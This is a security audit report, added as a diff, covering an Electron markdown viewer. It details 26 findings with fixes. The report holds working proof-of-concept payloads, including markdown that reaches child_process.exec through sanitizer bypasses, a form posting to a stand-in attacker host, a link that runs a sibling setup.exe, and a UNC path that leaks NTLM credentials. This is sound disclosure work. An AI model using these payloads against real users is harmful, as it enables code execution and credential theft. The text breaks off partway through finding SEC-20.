@@ -1,0 +1,741 @@
+# Security Audit — Omnicore Markdown Viewer (fork)
+
+**Target:** `C:\repos\github\md-viwer` — branch `fix/tab-state-sync` @ `3972921`
+**Date:** 2026-07-30
+**Scope:** Electron desktop app (`main.js`, `renderer.js`, `index.html`, `custom-*.js`, `omniwire/`, helper modules, build/release config). The bundled `vscode-extension/` sub-project was not audited in depth (separate artifact, separate threat model) — see Coverage.
+**Threat model:** `.md` / `.mmd` / `.ow` file content is **fully attacker-controlled** (downloaded, cloned from untrusted repos, or written by AI agents). The main window runs with `nodeIntegration: true` and `contextIsolation: false`, so **any HTML injection in the renderer is immediately arbitrary code execution with the user's full OS privileges.**
+
+## Executive summary
+
+The rendering pipeline sanitizes with DOMPurify, but then **re-concatenates attacker-controlled markdown into the HTML string *after* sanitization** and assigns the result to `innerHTML`. There are at least four independent zero-click paths from a malicious `.md` file to `require('child_process').exec()`, plus three more one-click paths through the popup windows, where the main process interpolates markdown-derived strings into HTML documents that it loads into further `nodeIntegration: true` windows.
+
+There is **no Content-Security-Policy**, **no preload script**, **no `will-navigate`/`setWindowOpenHandler` guard**, and the three core rendering libraries are **loaded from a public CDN with no Subresource Integrity** into the Node-privileged renderer.
+
+Practically: opening an untrusted markdown file in this application should be treated as equivalent to running an untrusted executable.
+
+| Severity | Count |
+|---|---|
+| Critical | 7 |
+| High | 6 |
+| Medium | 8 |
+| Low | 3 |
+| Info | 2 |
+| **Total** | **26** |
+
+**Provenance:** every Critical and High finding is **inherited from upstream** (`OmniCoreST/omnicore-markdown-viewer`) — `git blame` attributes the vulnerable lines in `renderer.js` and `main.js` to upstream authors (`can.kyq61-droid`, `Can Kaya`). The fork-specific files (`custom-tabs.js`, `custom-theme.js`, `custom-language.js`, `custom-collapse.js`, `custom-performance.js`) contain **no injection sinks** — they use `textContent` or static HTML literals. The fork introduces one Low finding (SEC-24, session persistence amplifier). This does not reduce the risk of publishing: publishing the fork publishes the vulnerabilities.
+
+---
+
+## SEC-01 — `@@@html` blocks execute arbitrary attacker JavaScript (deliberate sanitizer bypass)
+
+**Severity: Critical** · Category: StringInjection / DataIntegrityFailure · Confidence 9/10 · Upstream
+
+**Location:** `renderer.js:3212-3231` (full render path), `renderer.js:2999-3018` (light-format path)
+
+```js
+// renderer.js:3212-3230
+// Replace @@@html placeholders with sandboxed iframes (allows Tailwind CDN and scripts to run)
+rawHtmlBlocks.forEach(({ placeholder, code }, idx) => {
+  const srcdoc = [
+    '<!DOCTYPE html><html><head>', ..., '</head><body>',
+    code,                                    // <-- raw markdown, never sanitized
+    '<scr' + 'ipt>', ... , '</scr' + 'ipt>',
+    '</body></html>'
+  ].join('');
+  const escaped = srcdoc.replace(/"/g, '&quot;');
+  const iframeHtml = `<iframe class="raw-html-block" data-rawhtml-idx="${idx}" srcdoc="${escaped}" style="..." scrolling="no"></iframe>`;
+  html = html.replace(new RegExp(`<p>${placeholder}</p>|${placeholder}`), iframeHtml);
+});
+```
+
+Extraction is at `renderer.js:3127-3134`, explicitly commented *"Extract @@@html blocks and replace with placeholders (bypasses DOMPurify)"*. The resulting string reaches `patchViewerDOM(html)` → `temp.innerHTML = newHtml` at `renderer.js:2934`.
+
+**Why it is exploitable.** The comment claims the iframe is "sandboxed". **There is no `sandbox` attribute** — I grepped `main.js`, `renderer.js` and `index.html` for `sandbox` and the only hits are these two misleading comments. The iframe is created via `srcdoc`, which inherits the embedder's origin, so its scripts are same-origin with the Node-privileged main frame and can reach `window.parent.require`.
+
+Attack, zero clicks — opening the file is enough:
+
+````markdown
+@@@html
+<script>
+  window.parent.require('child_process').exec('calc.exe');
+</script>
+@@@
+````
+
+Even under the pessimistic assumption that Chromium blocks the `file:`-origin `parent` access, the finding remains Critical: the iframe still executes arbitrary attacker JS, which combined with **SEC-11** (no `will-navigate` guard) can do `top.location = 'https://attacker/x.html'` on the next user gesture, landing attacker HTML in the `nodeIntegration: true` top frame — guaranteed RCE.
+
+**Fix.** Remove the feature, or: (a) add `sandbox="allow-scripts"` **without** `allow-same-origin` — this alone forces an opaque origin and kills `parent.require`; (b) set `nodeIntegrationInSubFrames: false` explicitly and adopt `contextIsolation: true` (SEC-08); (c) put the raw HTML through DOMPurify like everything else and drop the "escape hatch" entirely.
+
+---
+
+## SEC-02 — Mermaid fence body is injected raw *after* DOMPurify
+
+**Severity: Critical** · Category: StringInjection · Confidence 9/10 · Upstream
+
+**Location:** `renderer.js:3191-3195` (injection) — occurs after `renderer.js:3155` (sanitization)
+
+```js
+// renderer.js:3151-3158  — sanitization happens HERE
+html = DOMPurify.sanitize(html, {
+  ADD_TAGS: ['iframe', 'style'],
+  ADD_ATTR: ['target', 'style', 'class', 'id', 'data-note-id', ...]
+});
+...
+// renderer.js:3191-3195 — ...and attacker content is spliced back in AFTER it
+mermaidBlocks.forEach(({ placeholder, code }) => {
+  const escapedSrc = code.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
+  const mermaidDiv = `<pre class="mermaid" data-mermaid-src="${escapedSrc}">${code}</pre>`;
+  html = html.replace(placeholder, mermaidDiv);   // ${code} is completely unescaped
+});
+```
+
+**Why it is exploitable.** `code` is the verbatim body of a ```` ```mermaid ```` fence, captured at `renderer.js:3110-3115`. `escapedSrc` escapes only `&` and `"` for the attribute; the element body `${code}` is escaped not at all — `<` and `>` pass through. The concatenated string is assigned to `innerHTML` at `renderer.js:2934`. `innerHTML` does not run inline `<script>`, but it *does* fire `onerror`/`onload` handlers.
+
+Zero-click payload — a plain `.md` file:
+
+````markdown
+```mermaid
+<img src=x onerror="require('child_process').exec('calc.exe')">
+```
+````
+
+Note the `.mmd` / `.mermaid` file association makes this worse: `file-helpers.js:57-63` auto-wraps the *entire* contents of any `.mmd` file in a mermaid fence, so the whole file body lands in this sink.
+
+**Secondary vector, same finding.** `renderer.js:3307-3311` and `renderer.js:6528-6530` interpolate `${error.message}` from a mermaid parse failure into `innerHTML` unescaped. Mermaid's parse errors quote the offending source line back verbatim, so a syntactically invalid diagram containing markup is a second route into the same sink. (I did not construct an end-to-end payload for this variant — the exact error string is parser-dependent — but the primary vector above is unconditional.)
+
+**Fix.** Escape `<`, `>`, `&`, `"` in `${code}` (it is display text inside `<pre>`, it never needs to be markup), and restructure the pipeline so DOMPurify is the **last** step before DOM insertion.
+
+---
+
+## SEC-03 — Image-slider blocks inject `src` and `alt` raw *after* DOMPurify
+
+**Severity: Critical** · Category: StringInjection · Confidence 9/10 · Upstream
+
+**Location:** `renderer.js:3166-3172`; source extraction at `renderer.js:3093-3104`
+
+```js
+// renderer.js:3168-3172 — runs after DOMPurify.sanitize at 3155
+const slidesHtml = images.map((img, i) =>
+  `<div class="slider-slide${i === 0 ? ' active' : ''}" data-index="${i}">
+    <img src="${img.src}" alt="${img.alt || ''}">
+    ${zoomBtnHtml}
+  </div>`
+).join('');
+```
+
+**Why it is exploitable.** `img.alt` and `img.src` come straight from a regex over the raw markdown (`renderer.js:3097`: `/!\[([^\]]*)\]\(([^)]+)\)/g`). Neither is escaped, and neither is constrained in a way that prevents a `"` from closing the attribute. The alt-text capture group `[^\]]*` permits quotes, parentheses, spaces and `=`.
+
+Zero-click payload:
+
+```markdown
+<!-- slider-start -->
+![" onerror="require('child_process').exec('calc.exe')](a.png)
+<!-- slider-end -->
+```
+
+This renders as `<img src="a.png" alt="" onerror="require('child_process').exec('calc.exe')">`. `a.png` does not exist, `onerror` fires on DOM insertion, `require` is in scope because `contextIsolation: false`.
+
+**Fix.** HTML-attribute-escape both values, or build the elements with `document.createElement` + `setAttribute` instead of string concatenation.
+
+---
+
+## SEC-04 — OmniWare DSL renderer emits unescaped HTML, injected *after* DOMPurify
+
+**Severity: Critical** · Category: StringInjection · Confidence 9/10 · Upstream
+
+**Location:** `renderer.js:3198-3210` (injection after sanitization); `omniwire/omniware.js` — many unescaped interpolations
+
+```js
+// renderer.js:3199-3204
+const renderedHtml = OmniWare.toHTML(code);
+const escapedDsl = code.replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+const omniwareDiv = `<div class="omniware-rendered" data-omniware-dsl="${escapedDsl}">${renderedHtml}</div>`;
+html = html.replace(placeholder, omniwareDiv);   // renderedHtml is trusted blindly
+```
+
+**Why it is exploitable.** `omniware.js` has an escaping helper — `parseInline()` at `omniwire/omniware.js:591-594` does `.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')` — but **most renderers never call it**. Confirmed unescaped sinks include:
+
+* `omniwire/omniware.js:767` — `` `<div class="ow-nav-logo">◈ ${items[0]}</div>` ``
+* `omniwire/omniware.js:772` — `` `<div class="ow-nav-item...">${label}</div>` ``
+* `omniwire/omniware.js:793` — `html += title;` (the `section` title prop)
+* `omniwire/omniware.js:842, 895, 931, 947, 961, 974, 1002, 1021, 1071-1100` — labels, values, options, textarea bodies, metric cards, form fields
+
+Props are parsed by `parseProps()` (`omniwire/omniware.js:637-660`) directly from the DSL with no filtering.
+
+Zero-click payload:
+
+````markdown
+```omniware
+@nav
+  <img src=x onerror=require('child_process').exec('calc.exe')> | Home
+```
+````
+
+The `.ow` file association makes this a one-double-click drive-by: `file-helpers.js:74-81` wraps the entire contents of any `.ow` file in an `omniware` fence.
+
+**Fix.** Route every user-derived value in `omniware.js` through `parseInline()` (or a dedicated `escapeHtml`), and sanitize `OmniWare.toHTML()` output before insertion.
+
+---
+
+## SEC-05 — Image popup: `alt` and `src` interpolated into a `nodeIntegration` HTML document by the main process
+
+**Severity: Critical** · Category: StringInjection · Confidence 9/10 · Upstream
+
+**Location:** `main.js:1579-1596` (window), `main.js:1611` and `main.js:1709` (injection); trigger at `renderer.js:3560-3566` and `renderer.js:3474-3480`
+
+```js
+// main.js:1583-1592
+const popupWindow = new BrowserWindow({ ..., webPreferences: {
+  nodeIntegration: true,
+  contextIsolation: false,
+}, title, ... });
+...
+// main.js:1611
+  <title>${alt || "Image Viewer"}</title>
+...
+// main.js:1709
+      <img id="the-img" src="${src}" alt="${alt || ""}">
+```
+
+**Why it is exploitable.** The renderer sends `alt: img.alt || ''` (`renderer.js:3563`) — the DOM `alt` **property**, i.e. the entity-decoded raw markdown alt text, quotes and angle brackets intact. DOMPurify preserves `alt` values verbatim (it is a text attribute, not a URL). The main process then interpolates it into a fresh HTML document with **zero escaping** and loads it into a window with full Node integration.
+
+Payload — user clicks the magnifier badge that the app itself renders on every image:
+
+```markdown
+![</title><script>require('child_process').exec('calc.exe')</script>](x.png)
+```
+
+`main.js:1611` closes the `<title>` element early and the injected `<script>` runs on load. Unlike the `innerHTML` sinks, this is a full document parse, so `<script>` executes directly. The `alt="${alt}"` sink at `main.js:1709` gives a second, `onerror`-based variant.
+
+**Fix.** HTML-escape `alt` and validate `src` against an allowlist (`file:`, `data:image/*`, `https:`) in the **main** process. Better: replace the string-built temp HTML with a static asset file plus `contextBridge`-delivered data.
+
+---
+
+## SEC-06 — OmniWare popup: `</script>` breakout defeats the template-literal escaping
+
+**Severity: Critical** · Category: StringInjection · Confidence 9/10 · Upstream
+
+**Location:** `main.js:1435-1449` (window), `main.js:1463-1467` (escaping), `main.js:1515` (injection); trigger at `renderer.js:3344-3349`
+
+```js
+// main.js:1463-1467
+const escapedDsl = dslCode
+  .replace(/\\/g, "\\\\")
+  .replace(/`/g, "\\`")
+  .replace(/\$/g, "\\$");
+...
+// main.js:1515 — inside a <script> element in the generated document
+    const dsl = \`${escapedDsl}\`;
+```
+
+**Why it is exploitable.** The escaping correctly protects the **JavaScript template literal** (backslash first, then backtick, then `$` — the right order). It does not protect the **HTML `<script>` element** that contains it. The HTML tokenizer terminates a script block at the first `</script`, regardless of JS string context. `<`, `>` and `/` are untouched by the three `.replace()` calls.
+
+Payload — user clicks the "maximize" button on the wireframe:
+
+````markdown
+```omniware
+@note
+  </script><script>require('child_process').exec('calc.exe')</script>
+```
+````
+
+The renderer round-trips this faithfully: `renderer.js:3200-3201` escapes `<`/`>` into the `data-omniware-dsl` attribute, and `renderer.js:3345-3346` decodes them straight back (`.replace(/&lt;/g,'<').replace(/&gt;/g,'>')`) before sending over IPC. Window is `nodeIntegration: true` (`main.js:1444-1445`).
+
+**Fix.** Additionally escape `<` as `\x3c` (or JSON-encode the value and parse it), and stop generating executable HTML from strings in the main process.
+
+---
+
+## SEC-07 — Mermaid popup: rendered SVG interpolated raw into a `nodeIntegration` document
+
+**Severity: High** · Category: StringInjection · Confidence 7/10 · Upstream
+
+**Location:** `main.js:1060-1075` (window, `nodeIntegration: true` at `main.js:1070-1071`), `main.js:1164` (`${svgContent}` interpolated raw); trigger at `renderer.js:3293-3296` and `renderer.js:6502`
+
+**Why it is a risk.** `svgContent` is `svg.outerHTML` of a mermaid-rendered diagram, injected into a generated HTML document with no escaping and no sanitization. Mermaid's default `securityLevel: 'strict'` (see Coverage — the app never overrides it) means labels are DOMPurify-sanitized by mermaid itself, so I **could not construct a working payload** for the pinned version; the SVG serialization path also re-escapes text nodes.
+
+However: the app pins **mermaid 10.6.1** from a CDN (`index.html:27`), which is below the 10.9.6 fix line for the mermaid sanitization advisories, and this sink has zero defence in depth — a single mermaid sanitizer bypass converts directly into RCE, because unlike the main viewer this document is parsed as a full HTML document (so `<script>` executes, not just event handlers).
+
+**Fix.** Sanitize `svgContent` in the main process before interpolation, and load the popup with `nodeIntegration: false, contextIsolation: true` (the table popup at `main.js:1866-1867` already demonstrates this is feasible).
+
+---
+
+## SEC-08 — `nodeIntegration: true`, `contextIsolation: false`, no preload on four of five windows
+
+**Severity: Critical** · Category: SecurityMisconfiguration · Confidence 10/10 · Upstream
+
+**Location:** `main.js:128-133` (main window), `main.js:1069-1072` (mermaid popup), `main.js:1443-1446` (omniware popup), `main.js:1588-1591` (image popup). Contrast: `main.js:1865-1868` (table popup) correctly uses `nodeIntegration: false, contextIsolation: true`.
+
+```js
+// main.js:128-133
+webPreferences: {
+  nodeIntegration: true,
+  contextIsolation: false,
+  enableRemoteModule: true,
+  backgroundThrottling: true,
+},
+```
+
+**Why it matters.** This is the multiplier that turns every finding above from "annoying HTML injection" into "remote code execution". `renderer.js:4-8` immediately pulls `ipcRenderer`, `shell`, `clipboard`, `fs` and `path` into the global scope, and `renderer.js:~5600` re-exports `window.fs`, `window.path`, `window.ipcRenderer` for the custom overlays — so injected script does not even need `require`; `window.fs` is sitting there.
+
+I confirmed **no preload script exists** anywhere in the repo (no `preload:` key in any `webPreferences`, no `preload.js` file). There is therefore no `contextBridge` surface at all; the renderer is simply a privileged Node process rendering hostile input.
+
+`enableRemoteModule: true` (`main.js:131`) is a no-op on Electron 37 (the remote module was removed in Electron 14), but it signals the app was written against a much older, pre-hardening Electron security model.
+
+The table popup at `main.js:1856-1868` shows the correct configuration — the divergence appears to be incidental (Tabulator needs no Node) rather than a deliberate security decision, since the three popups that *do* handle attacker-controlled content are the insecure ones.
+
+**Fix.** The correct long-term fix is `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true` on every window, with a minimal preload exposing a typed, validated API over `contextBridge`. This is a substantial refactor because `renderer.js` uses `fs`/`path` directly in ~40 places. As an interim step, at minimum flip the three popup windows (`main.js:1069, 1443, 1588`) to `nodeIntegration: false` — they have no legitimate Node requirement beyond `ipcRenderer.send`, which a 10-line preload can provide.
+
+---
+
+## SEC-09 — No Content-Security-Policy anywhere
+
+**Severity: High** · Category: SecurityMisconfiguration · Confidence 10/10 · Upstream
+
+**Location:** `index.html:1-31` (no `<meta http-equiv="Content-Security-Policy">`); `main.js` (no `session.defaultSession.webRequest.onHeadersReceived`, no `session` usage at all)
+
+I grepped `main.js`, `renderer.js` and `index.html` for `Content-Security`, `session.`, `defaultSession`, `onHeadersReceived` — **zero matches**. The generated popup documents (`main.js:1083`, `1469`, `1604`, `1878`) likewise have no CSP meta tag.
+
+**Why it matters.** A CSP of `script-src 'self'` would have blocked SEC-05, SEC-06 and the `<script>` half of SEC-01 outright, and `default-src 'self'` would block the exfiltration/beaconing in SEC-15. Its absence means an injected payload can also freely `fetch()` attacker infrastructure to stage a second-stage payload or exfiltrate `fs.readFileSync` output.
+
+Electron logs an explicit "Insecure Content-Security-Policy" warning for exactly this configuration.
+
+**Fix.** Add a restrictive CSP. Note this requires resolving SEC-10 first (the current CDN `<script>` tags would be blocked by `script-src 'self'` — which is the point).
+
+---
+
+## SEC-10 — Core libraries loaded from a public CDN with no Subresource Integrity, into the Node-privileged renderer
+
+**Severity: High** · Category: SupplyChainAttack / AuthenticationFailure · Confidence 9/10 · Upstream
+
+**Location:** `index.html:26-28`, plus `index.html:13-24` (Google Fonts)
+
+```html
+<script src="https://cdn.jsdelivr.net/npm/marked@9.1.6/marked.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10.6.1/dist/mermaid.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>
+```
+
+**Why it is exploitable.** Three third-party scripts execute with `require()` in scope, over the network, with:
+* **no `integrity=` / SRI hash** — a jsDelivr compromise, a hostile CDN edge, a corporate TLS-intercepting proxy, or DNS/BGP hijack yields silent RCE on every user of the app;
+* **no CSP to constrain them** (SEC-09);
+* **one of them is the security control itself** — DOMPurify. An attacker who can influence the CDN response for `purify.min.js` disables the sanitizer for the entire application.
+
+The versions requested from the CDN are also **older than what is installed locally** and carry known advisories (SEC-16). Note the irony: `package.json:44-52` already declares `marked`, `mermaid` and `dompurify` as dependencies and `npm ls` confirms they are installed under `node_modules/`, and `package.json` `build.files` ships `node_modules/**/*` into the package — yet `index.html` loads the CDN copies instead. PrismJS is already correctly loaded from disk (`index.html:30` → `libs/prismjs/prism-bundle.js`), so the local-loading pattern is established in the codebase.
+
+There is also a functional-availability consequence worth noting: with no network, `DOMPurify`, `marked` and `mermaid` are all `undefined` and rendering throws.
+
+**Fix.** Load all three from `node_modules/` or `libs/` like Prism already is. Remove the Google Fonts `<link>`s (`index.html:13-24`) or bundle the font — the fork already ships FiraCode TTFs under `vscode-extension/media/fonts/`.
+
+---
+
+## SEC-11 — No navigation guards: `will-navigate` / `setWindowOpenHandler` are absent, and `<form action>` survives sanitization
+
+**Severity: High** · Category: SecurityMisconfiguration · Confidence 8/10 · Upstream
+
+**Location:** `main.js` — no `will-navigate`, `new-window` or `setWindowOpenHandler` handler exists on any `webContents` (grepped, zero matches). Sanitizer config at `renderer.js:3155-3158`.
+
+**Why it is exploitable.** Nothing prevents the top-level frame of the `nodeIntegration: true` main window from navigating to a remote URL. If that happens, the attacker's page *is* the Node-privileged renderer.
+
+I verified against the bundled DOMPurify allowlist (`node_modules/dompurify/dist/purify.js:305` and `:319`) that **`form` is an allowed tag and `action` is an allowed attribute**. So this markdown survives sanitization intact:
+
+```html
+<form action="https://attacker.example/pwn.html" method="GET">
+  <button>Click to view the full diagram</button>
+</form>
+```
+
+One click navigates the main window to attacker-controlled HTML, which then runs with `require`. The click handler at `renderer.js:1320-1418` only intercepts `<a>` elements (`e.target.closest('a')`) — form submission is not intercepted.
+
+This is also the escalation path that makes SEC-01 unconditionally Critical.
+
+**Fix.** Add on every window:
+```js
+win.webContents.on('will-navigate', (e, url) => {
+  if (url !== win.webContents.getURL()) e.preventDefault();
+});
+win.webContents.setWindowOpenHandler(() => ({ action: 'deny' }));
+```
+and add `'form'`, `'action'`, `'formaction'` to DOMPurify's `FORBID_TAGS`/`FORBID_ATTR`.
+
+---
+
+## SEC-12 — One-click execution of an arbitrary local file via a markdown link (`shell.openPath`)
+
+**Severity: High** · Category: BrokenAccessControl · Confidence 9/10 · Upstream
+
+**Location:** `renderer.js:1384-1418`
+
+```js
+// renderer.js:1408-1415
+if (fs.existsSync(targetPath)) {
+  const ext = path.extname(targetPath).toLowerCase();
+  if (['.md', '.markdown', '.mmd', '.mermaid', '.ow'].includes(ext)) {
+    ipcRenderer.send('open-file-path', targetPath);
+  } else {
+    shell.openPath(targetPath);      // <-- any other extension, no allowlist, no prompt
+  }
+}
+```
+
+**Why it is exploitable.** The threat model explicitly includes *"cloned from untrusted repos"* and *"downloaded from the internet"* — i.e. the markdown arrives **alongside sibling files the attacker also controls**. `targetPath` is resolved relative to the markdown's own directory (`renderer.js:1401-1404`), and there is no extension allowlist, no path containment check, and **no confirmation dialog**.
+
+Attack: a repo/zip containing `README.md` and `setup.exe`, where `README.md` says:
+
+```markdown
+See the [architecture diagram](./setup.exe) for details.
+```
+
+One click on a link that looks like documentation → `shell.openPath` hands the file to the Windows shell → the executable runs. `.bat`, `.cmd`, `.hta`, `.scr`, `.lnk`, `.msi`, `.ps1` all work identically. On Linux/macOS the equivalent is a `.desktop` file or a shell script with the execute bit set.
+
+Related, same code path: `path.isAbsolute()` treats `\\attacker.example\share\x.md` as absolute on Windows, so `fs.existsSync(targetPath)` at `renderer.js:1408` triggers an outbound SMB connection and an NTLMv2 challenge/response leak. DOMPurify permits such an href — its `IS_ALLOWED_URI` regex (`node_modules/dompurify/dist/purify.js:~330`) accepts any scheme-less value starting with a non-`[a-z]` character, including `\`.
+
+**Fix.** Allowlist safe extensions for `shell.openPath` (documents, images), refuse executables outright, and show an explicit confirmation dialog naming the file for anything else. Reject UNC paths and paths that escape the document's directory.
+
+---
+
+## SEC-13 — Unescaped `data-note-id` in the notes tooltip and notes list
+
+**Severity: High** · Category: StringInjection · Confidence 8/10 · Upstream
+
+**Location:** `renderer.js:5588` (tooltip), `renderer.js:2457` (notes side panel)
+
+```js
+// renderer.js:5586-5589
+if (title)   html += `<div class="note-tooltip-title">${title.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>`;
+if (content) html += `<div class="note-tooltip-content">${content.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>`;
+if (noteId)  html += `<div class="note-tooltip-id">#${noteId}</div>`;   // <-- NOT escaped
+noteTooltip.innerHTML = html;
+```
+
+**Why it is exploitable.** `title` and `content` are carefully escaped on the two adjacent lines; `noteId` is not — an inconsistency that reads like an oversight rather than a deliberate trust decision. `noteId` is read from the `data-note-id` DOM attribute (`renderer.js:5580`, `renderer.js:2438`), and `data-note-id` is **explicitly whitelisted** in the DOMPurify config at `renderer.js:3157` (`ADD_ATTR: [..., 'data-note-id', ...]`), so its value passes through the sanitizer untouched with full attacker control.
+
+Payload — fires when the user hovers the highlighted text (the app renders notes with a visible underline/highlight that invites hovering):
+
+```markdown
+<span class="noted-text" data-note-id="<img src=x onerror=require('child_process').exec('calc.exe')>" data-note-title="Note">hover me</span>
+```
+
+The same unescaped `#${noteId}` appears in the All Notes panel at `renderer.js:2457`, which renders automatically whenever the document contains any note (`renderer.js:2423`) — that variant needs no hover.
+
+**Fix.** Escape `noteId` identically to `title`/`content`, or better, validate it as `/^\d+$/` (the codebase already assumes it is numeric — see `parseInt` at `renderer.js:2432` and the `\d+` regex at `renderer.js:4662`).
+
+---
+
+## SEC-14 — Unescaped filename and path in the recent-files menu
+
+**Severity: Medium** · Category: StringInjection · Confidence 8/10 · Upstream
+
+**Location:** `renderer.js:2083-2087`
+
+```js
+item.innerHTML = `
+  <span class="tools-menu-recent-name">${file.name}</span>
+  <span class="tools-menu-recent-path">${file.path}</span>
+`;
+```
+
+**Why it is exploitable.** Filesystem-derived strings go to `innerHTML` unescaped. On Linux and macOS (both are release targets — `package.json` `build.linux` / `build.mac`) `<`, `>`, `"` and `&` are all legal filename characters. A file named `<img src=x onerror=require('child_process').exec('id')>.md` inside an untrusted archive executes the moment the user opens the File menu after having opened it once. Because recent files are persisted, the payload re-arms on every launch until cleared.
+
+Rated Medium rather than High because it is not reachable on Windows (`<>` are illegal in NTFS filenames) and requires the user to open the menu.
+
+**Fix.** Use `textContent` on two child spans, as `custom-tabs.js:392-394` already does correctly for tab titles.
+
+---
+
+## SEC-15 — Table popup: `JSON.stringify` into a `<script>` block allows `</script>` breakout
+
+**Severity: Medium** · Category: StringInjection · Confidence 8/10 · Upstream
+
+**Location:** `main.js:2119-2122`
+
+```html
+<script>
+    ${tabulatorJs}
+    const tableData = ${JSON.stringify(tableData)};
+```
+
+**Why it is exploitable.** `JSON.stringify` does not escape `<` or `/`. `tableData` is built from markdown table cell `textContent` (`renderer.js:extractTableData`), so a table cell containing `</script><script>...</script>` closes the script element and injects arbitrary JS.
+
+Impact is **contained** — and this is the one popup that is configured correctly: `main.js:1865-1868` sets `nodeIntegration: false, contextIsolation: true`. So this is arbitrary JS in a Node-free window, not RCE. It can still exfiltrate the table contents, render a convincing credential-phishing prompt in a window bearing the app's identity, and (with no CSP) beacon out.
+
+**Fix.** `JSON.stringify(tableData).replace(/</g, '\\u003c')`, the standard mitigation.
+
+---
+
+## SEC-16 — Pinned CDN library versions carry known published vulnerabilities
+
+**Severity: Medium** · Category: SupplyChainAttack · Confidence 9/10 · Upstream
+
+**Location:** `index.html:26-28`
+
+The versions that actually execute are the CDN-pinned ones, **not** the (newer) ones in `node_modules` — so `npm audit` does not see them at all. This is a reporting blind spot worth calling out explicitly.
+
+| Loaded (index.html) | Installed (`npm ls`) | Known issues in the loaded version |
+|---|---|---|
+| `dompurify@3.0.6` | 3.4.12 | **CVE-2024-45801** (prototype pollution bypassing depth checks) and **CVE-2024-47875** (nesting mXSS). Both affect `>=3.0.0 <3.1.3`; fixed in 3.1.3. |
+| `mermaid@10.6.1` | 10.9.6 | Below the 10.9.6 / 11.15.0 fix line for the mermaid improper-sanitization and CSS-injection advisories (GHSA-87f9-hvmw-gh4p, GHSA-6m6c-36f7-fhxh). |
+| `marked@9.1.6` | 9.1.6 | No advisory outstanding for 9.1.6, but v9 is long EOL (current is v16). |
+
+A DOMPurify sanitizer bypass in this application is not "an XSS" — given SEC-08, it is RCE.
+
+**Fix.** Load from `node_modules` (SEC-10) and bump `dompurify` to `^3.2.4+`, `mermaid` to `^11.15.0` (or `^10.9.6`), `marked` to a current major.
+
+---
+
+## SEC-17 — Electron 37 has 17 published high-severity advisories
+
+**Severity: Medium** · Category: SecurityMisconfiguration · Confidence 9/10 · Upstream
+
+**Location:** `package.json:41` (`"electron": "^37.0.0"`); resolved to `electron@37.10.3`
+
+`npm audit` (run against the configured Microsoft proxy registry — the command succeeded) reports `electron <=39.8.4` as high severity with 17 advisories, including **GHSA-3c8v-cfp5-9885 — out-of-bounds read in second-instance IPC on macOS and Linux**, which is directly reachable here: `main.js:2318` registers a `second-instance` handler and `main.js:2327` feeds the attacker-influenced `commandLine` into `handleFileArgument`. Also relevant: GHSA-9wfr-w7mm-pc7f (renderer command-line switch injection) and GHSA-r5p7-gp4j-qhrx (incorrect origin passed to permission handler for iframe requests — pertinent given SEC-01).
+
+**Fix.** Upgrade to Electron 41.7.1+. Note this is a major-version jump; the `enableRemoteModule` leftover at `main.js:131` suggests the codebase has not been reviewed against modern Electron in some time.
+
+---
+
+## SEC-18 — Build toolchain: critical `tar` advisory and 23 high-severity transitive vulnerabilities
+
+**Severity: Medium** · Category: SupplyChainAttack · Confidence 9/10 · Upstream
+
+**Location:** `package.json:42` (`electron-builder ^24.6.4`), `package.json:46` (`electron-updater ^6.1.7`)
+
+`npm audit` summary: **24 vulnerabilities (23 high, 1 critical)**. Highlights:
+
+* **`tar` (critical)** — 12 advisories including GHSA-34x7-hfp2-rc4v and GHSA-8qq5-rm4j-mr97 (arbitrary file write / symlink poisoning during extraction).
+* **`builder-util-runtime <9.7.0` (high)** — **GHSA-p2f4-r6v6-j797**: `electron-updater` leaks `PRIVATE-TOKEN` and mixed-case `Authorization` credentials across a cross-origin redirect. `electron-updater` is a **runtime** dependency here (`main.js:63`), not just build tooling.
+* **`app-builder-lib` (high)** — **GHSA-7g7r-gx96-252g**: uncontrolled search path elements in `AppImage` builds. The project ships AppImage (`package.json` `build.linux.target`), so this affects delivered artifacts.
+
+`npm audit fix --force` would install `electron-builder@26.15.3` (breaking).
+
+**Fix.** Upgrade `electron-builder` to 26.x and `electron-updater` to a version depending on `builder-util-runtime >=9.7.0`. These do not ship in the app bundle (except `electron-updater`), but they run in CI with `contents: write` permission.
+
+---
+
+## SEC-19 — Release workflow: unpinned third-party action and unpinned dependency install
+
+**Severity: Medium** · Category: SupplyChainAttack · Confidence 8/10 · Upstream
+
+**Location:** `.github/workflows/release.yml:87` and `.github/workflows/release.yml:29`
+
+```yaml
+# .github/workflows/release.yml:86-88
+      - name: Create Release
+        uses: softprops/action-gh-release@v1     # mutable tag, third-party namespace
+```
+```yaml
+# .github/workflows/release.yml:28-29
+      - name: Install dependencies
+        run: npm install                         # not `npm ci`, lockfile not enforced
+```
+
+**Why it matters.** The workflow runs with `permissions: contents: write` (`.github/workflows/release.yml:9-10`) and publishes signed-by-nobody binaries to GitHub Releases. `softprops/action-gh-release` is a third-party action pinned to a **mutable** `v1` tag — whoever controls that repo (or a compromised maintainer account) can move the tag and gain write access to the release artifacts users download. `actions/checkout@v4`, `actions/setup-node@v4` and `actions/upload-artifact@v4` are in GitHub's official namespace and are acceptable per normal practice.
+
+`npm install` (rather than `npm ci`) means `package-lock.json` is advisory only, so a compromised or typosquatted transitive dependency can be pulled into a release build.
+
+Compounding this: `package.json` sets `"sign": null` (`build.win.sign`), so Windows releases are unsigned, and the app auto-updates from GitHub Releases via `electron-updater`.
+
+**Fix.** Pin `softprops/action-gh-release` to a full commit SHA. Switch to `npm ci`. Consider code signing for release binaries.
+
+---
+
+## SEC-20 — Predictable temp-file paths for generated HTML and the update batch script
+
+**Severity: Medium** · Category: SecurityMisconfiguration · Confidence 7/10 · Upstream
+
+**Location:** `main.js:1080`, `main.js:1468`, `main.js:1598`, `main.js:1876`, `main.js:2484`
+
+```js
+const tempHtmlPath = path.join(os.tmpdir(), "omnicore-temp-mermaid.html");   // main.js:1080
+const tempHtmlPath = path.join(os.tmpdir(), "omnicore-temp-omniware.html");  // main.js:1468
